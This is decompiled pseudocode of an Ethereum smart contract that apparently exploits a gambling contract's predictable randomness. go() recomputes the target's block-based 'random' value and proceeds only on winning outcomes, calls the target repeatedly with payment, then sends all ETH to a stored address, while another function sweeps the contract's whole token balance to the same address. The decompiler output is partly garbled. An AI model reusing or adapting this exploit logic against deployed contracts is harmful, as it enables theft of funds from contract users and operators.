contract main {




// =====================  Runtime code  =====================


const getRandom = uint8(sha3(block.difficulty, 0, Mask(208, 48, block.timestamp) >> 48 >> 256, block.timestamp % 281474976710656) % 100)


address stor0;
address stor1;

function _fallback() payable {
  stop
}

function sub_88156247(?) {
    require ext_code.size(arg1)
    call arg1.0x70a08231 with:
         gas gas_remaining wei
        args this.address
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    if ext_call.return_data[0] > 0:
        require ext_code.size(arg1)
        call arg1.0xa9059cbb with:
             gas gas_remaining wei
            args stor1, ext_call.return_data[0]
        if not ext_call.success:
            revert with ext_call.return_data[0 len return_data.size]
        require return_data.size >= 32
}

function go() payable {
    require msg.value == 39 * 10^16
    require uint8(sha3(block.difficulty, 0, Mask(208, 48, block.timestamp) >> 48 >> 256, block.timestamp % 281474976710656) % 100) >= 80
    idx = 0
    while idx < eth.balance(0x8a6ca6633d31135d9340e04698854225e3b898f7) / 10^18:
        mem[198] = 0xe322bb0000000000000000000000000000000000000000000000000000000 * 3600
        mem[202] = 0x581ee3e3ab27a226739d32c5f3e5a496e8a931665f9a319e41121908c80068e8
        require ext_code.size(stor0)
        call stor0.0xc7a1865b with:
           value msg.value wei
             gas gas_remaining wei
            args 0x581ee3e3ab27a226739d32c5f3e5a496e8a931665f9a319e41121908c80068e8
        if not ext_call.success:
            revert with ext_call.return_data[0 len return_data.size]
        idx = idx + 1
        continue 
    require eth.balance(this.address) >= 10^18
    call stor1 with:
       value eth.balance(this.address) wei
         gas 2300 * is_zero(value) wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
}



}
